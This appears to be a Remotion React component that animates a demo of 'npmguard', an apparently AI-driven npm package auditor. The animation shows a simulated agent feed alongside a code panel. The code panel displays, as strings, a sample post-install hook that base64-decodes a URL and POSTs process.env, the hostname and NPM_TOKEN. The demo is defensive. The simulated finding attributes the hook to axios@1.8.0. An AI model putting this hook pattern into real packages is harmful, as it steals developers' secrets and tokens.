import {
  AbsoluteFill,
  interpolate,
  spring,
  useCurrentFrame,
  useVideoConfig,
} from "remotion";
import { colors, fonts, springs } from "../lib/theme";

// Simulated agent feed events with frame timings (240 frames total)
const EVENTS = [
  { frame: 0, type: "phase", text: "Scanning source..." },
  { frame: 12, type: "tool", text: "readFile('package.json')" },
  { frame: 28, type: "tool", text: "mapCapabilities()" },
  { frame: 45, type: "thinking", text: "Network access detected — outbound HTTP calls" },
  { frame: 65, type: "thinking", text: "File system write — post-install hook" },
  { frame: 85, type: "triage", text: "lib/post-install.js — attack vector found" },
  { frame: 105, type: "phase", text: "Running penetration tests..." },
  { frame: 120, type: "tool", text: "generateExploitTest('env-exfil')" },
  { frame: 140, type: "tool", text: "executeSandbox('vitest run')" },
  { frame: 165, type: "finding", text: "CONFIRMED: env var exfiltration via POST" },
  { frame: 185, type: "phase", text: "Generating verifiable proof..." },
  { frame: 200, type: "tool", text: "publishProof()" },
  { frame: 220, type: "finding", text: "Proof published on-chain — test is runnable" },
];

// Code lines for the right panel
const CODE_LINES = [
  { text: 'const http = require("http");', suspicious: false },
  { text: 'const os = require("os");', suspicious: false },
  { text: "", suspicious: false },
  { text: "// post-install hook", suspicious: false },
  { text: "module.exports = async () => {", suspicious: false },
  { text: "  const d = Buffer.from(", suspicious: true },
  { text: '    "aHR0cDovLzE5Mi4xNjguMS4x",', suspicious: true },
  { text: '    "base64"', suspicious: true },
  { text: "  ).toString();", suspicious: true },
  { text: "", suspicious: false },
  { text: "  const payload = {", suspicious: true },
  { text: "    env: process.env,", suspicious: true },
  { text: "    host: os.hostname(),", suspicious: true },
  { text: "    token: process.env.NPM_TOKEN", suspicious: true },
  { text: "  };", suspicious: true },
  { text: "", suspicious: false },
  { text: "  http.request(d, {", suspicious: true },
  { text: '    method: "POST",', suspicious: true },
  { text: "    body: JSON.stringify(payload)", suspicious: true },
  { text: "  });", suspicious: true },
  { text: "};", suspicious: false },
];

const PhaseProgress: React.FC<{ frame: number; fps: number }> = ({
  frame,
  fps,
}) => {
  const phases = ["Scan", "Pentest", "Proof", "Done"];
  const activePhase =
    frame < 105 ? 0 : frame < 185 ? 1 : frame < 220 ? 2 : 3;

  return (
    <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
      {phases.map((phase, i) => {
        const done = i < activePhase;
        const active = i === activePhase;
        const pipScale = done
          ? spring({
              frame: frame - [0, 105, 185, 220][i],
              fps,
              config: { damping: 12, stiffness: 200 },
            })
          : 1;

        return (
          <div key={i} style={{ display: "flex", alignItems: "center", gap: 6 }}>
            <div
              style={{
                width: 24,
                height: 4,
                borderRadius: 2,
                backgroundColor: done
                  ? colors.safe
                  : active
                    ? colors.investigating
                    : colors.textMuted,
                transform: `scaleX(${pipScale})`,
                opacity: active ? interpolate(Math.sin(frame * 0.2), [-1, 1], [0.6, 1]) : 1,
              }}
            />
            <span
              style={{
                fontFamily: fonts.mono,
                fontSize: 10,
                color: done
                  ? colors.safe
                  : active
                    ? colors.investigating
                    : colors.textMuted,
                textTransform: "uppercase",
              }}
            >
              {phase}
            </span>
          </div>
        );
      })}
    </div>
  );
};

const FeedItem: React.FC<{
  event: (typeof EVENTS)[0];
  localFrame: number;
  fps: number;
}> = ({ event, localFrame, fps }) => {
  const enterProgress = spring({
    frame: localFrame,
    fps,
    config: springs.snappy,
  });

  const opacity = interpolate(enterProgress, [0, 1], [0, 1]);
  const translateY = interpolate(enterProgress, [0, 1], [15, 0]);

  const isFinding = event.type === "finding";
  const slamScale = isFinding
    ? spring({ frame: localFrame, fps, config: { damping: 12, stiffness: 300 } })
    : 1;

  const tagColors: Record<string, { bg: string; fg: string }> = {
    phase: { bg: colors.bgTertiary, fg: colors.textDim },
    tool: { bg: colors.investigatingBg, fg: colors.investigating },
    thinking: { bg: "rgba(201, 168, 76, 0.1)", fg: colors.accent },
    triage: { bg: colors.suspectedBg, fg: colors.suspected },
    finding: { bg: colors.dangerBg, fg: colors.danger },
  };

  const { bg, fg } = tagColors[event.type] || tagColors.phase;

  return (
    <div
      style={{
        opacity,
        transform: `translateY(${translateY}px) scale(${slamScale})`,
        padding: "6px 12px",
        borderRadius: 6,
        backgroundColor: bg,
        marginBottom: 6,
        display: "flex",
        alignItems: "center",
        gap: 8,
      }}
    >
      <span
        style={{
          fontFamily: fonts.mono,
          fontSize: 10,
          color: fg,
          textTransform: "uppercase",
          opacity: 0.7,
          minWidth: 60,
        }}
      >
        {event.type}
      </span>
      <span
        style={{
          fontFamily: fonts.mono,
          fontSize: 13,
          color: fg,
          fontWeight: isFinding ? 700 : 400,
        }}
      >
        {event.text}
      </span>
    </div>
  );
};

export const AgentFeed: React.FC = () => {
  const frame = useCurrentFrame();
  const { fps } = useVideoConfig();

  // Visible events based on current frame
  const visibleEvents = EVENTS.filter((e) => frame >= e.frame);

  // Code viewer reveal
  const codeReveal = interpolate(frame, [20, 45], [0, 1], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });

  // Scanner sweep line
  const scannerY = interpolate(frame, [45, 160], [-20, CODE_LINES.length * 26], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });

  // Highlight suspicious lines after scanner passes
  const highlightOpacity = (lineIndex: number) => {
    const lineY = lineIndex * 26;
    if (scannerY < lineY) return 0;
    return interpolate(scannerY - lineY, [0, 40], [0, 1], {
      extrapolateRight: "clamp",
    });
  };

  // Risk score animation
  const riskScore = Math.min(
    8,
    Math.floor(
      interpolate(frame, [85, 200], [0, 8], {
        extrapolateLeft: "clamp",
        extrapolateRight: "clamp",
      }),
    ),
  );

  const riskColor =
    riskScore >= 7 ? colors.danger : riskScore >= 4 ? colors.suspected : colors.safe;

  // Auto-scroll feed: shift up as more items appear
  const feedScrollY = interpolate(
    visibleEvents.length,
    [0, 8, 14],
    [0, 0, -120],
    { extrapolateRight: "clamp", extrapolateLeft: "clamp" },
  );

  return (
    <AbsoluteFill style={{ backgroundColor: colors.bg }}>
      {/* Header bar */}
      <div
        style={{
          position: "absolute",
          top: 0,
          left: 0,
          right: 0,
          height: 52,
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "0 28px",
          borderBottom: `1px solid rgba(255,255,255,0.06)`,
          background: `linear-gradient(90deg, ${colors.bgSecondary}, rgba(201, 168, 76, 0.03), ${colors.bgSecondary})`,
        }}
      >
        <div
          style={{
            fontFamily: fonts.heading,
            fontSize: 16,
            fontWeight: 700,
            color: colors.text,
            display: "flex",
            alignItems: "center",
            gap: 10,
          }}
        >
          <span style={{ color: colors.accent }}>npmguard</span>
          <span style={{ color: colors.textMuted, fontWeight: 400 }}>
            auditing axios@1.8.0
          </span>
        </div>
        <PhaseProgress frame={frame} fps={fps} />
      </div>

      {/* Main content area */}
      <div
        style={{
          position: "absolute",
          top: 52,
          left: 0,
          right: 0,
          bottom: 0,
          display: "flex",
        }}
      >
        {/* Left: Agent Activity Feed */}
        <div
          style={{
            width: 520,
            borderRight: `1px solid rgba(255,255,255,0.06)`,
            padding: "16px 16px",
            overflow: "hidden",
          }}
        >
          <div
            style={{
              fontFamily: fonts.mono,
              fontSize: 11,
              color: colors.textMuted,
              textTransform: "uppercase",
              letterSpacing: "0.1em",
              marginBottom: 12,
            }}
          >
            Agent Activity
          </div>

          <div style={{ transform: `translateY(${feedScrollY}px)` }}>
            {visibleEvents.map((event, i) => (
              <FeedItem
                key={i}
                event={event}
                localFrame={frame - event.frame}
                fps={fps}
              />
            ))}
          </div>

          {/* Risk score pill */}
          {frame > 85 && (
            <div
              style={{
                position: "absolute",
                bottom: 20,
                left: 16,
                display: "flex",
                alignItems: "center",
                gap: 10,
                padding: "8px 16px",
                borderRadius: 8,
                backgroundColor: colors.bgSecondary,
                border: `1px solid rgba(255,255,255,0.06)`,
              }}
            >
              <span
                style={{
                  fontFamily: fonts.mono,
                  fontSize: 12,
                  color: colors.textMuted,
                }}
              >
                Risk Score
              </span>
              <span
                style={{
                  fontFamily: fonts.mono,
                  fontSize: 20,
                  fontWeight: 700,
                  color: riskColor,
                }}
              >
                {riskScore}/10
              </span>
            </div>
          )}
        </div>

        {/* Right: Code Viewer */}
        <div
          style={{
            flex: 1,
            backgroundColor: colors.bgCode,
            padding: "16px 0",
            opacity: codeReveal,
            overflow: "hidden",
            position: "relative",
          }}
        >
          <div
            style={{
              fontFamily: fonts.mono,
              fontSize: 11,
              color: colors.textMuted,
              textTransform: "uppercase",
              letterSpacing: "0.1em",
              marginBottom: 12,
              paddingLeft: 60,
            }}
          >
            lib/post-install.js
          </div>

          {CODE_LINES.map((line, i) => {
            const susOpacity = line.suspicious ? highlightOpacity(i) : 0;
            return (
              <div
                key={i}
                style={{
                  display: "flex",
                  alignItems: "center",
                  height: 26,
                  paddingLeft: 16,
                  backgroundColor: line.suspicious
                    ? `rgba(248, 113, 113, ${susOpacity * 0.08})`
                    : "transparent",
                  borderLeft: line.suspicious
                    ? `3px solid rgba(248, 113, 113, ${susOpacity})`
                    : "3px solid transparent",
                }}
              >
                <span
                  style={{
                    fontFamily: fonts.mono,
                    fontSize: 12,
                    color: colors.textMuted,
                    width: 36,
                    textAlign: "right",
                    marginRight: 16,
                    userSelect: "none",
                  }}
                >
                  {i + 1}
                </span>
                <span
                  style={{
                    fontFamily: fonts.mono,
                    fontSize: 14,
                    color: line.suspicious
                      ? interpolate(
                          susOpacity,
                          [0, 1],
                          [0, 1],
                        ) > 0.5
                        ? colors.danger
                        : colors.text
                      : colors.text,
                  }}
                >
                  {line.text}
                </span>
              </div>
            );
          })}

          {/* Scanner sweep line */}
          {frame >= 45 && frame <= 170 && (
            <div
              style={{
                position: "absolute",
                left: 52,
                right: 0,
                top: 40 + scannerY,
                height: 2,
                background: `linear-gradient(90deg, ${colors.investigating}, transparent)`,
                opacity: interpolate(Math.sin(frame * 0.3), [-1, 1], [0.4, 0.8]),
                boxShadow: `0 0 20px ${colors.investigating}`,
              }}
            />
          )}
        </div>
      </div>
    </AbsoluteFill>
  );
};
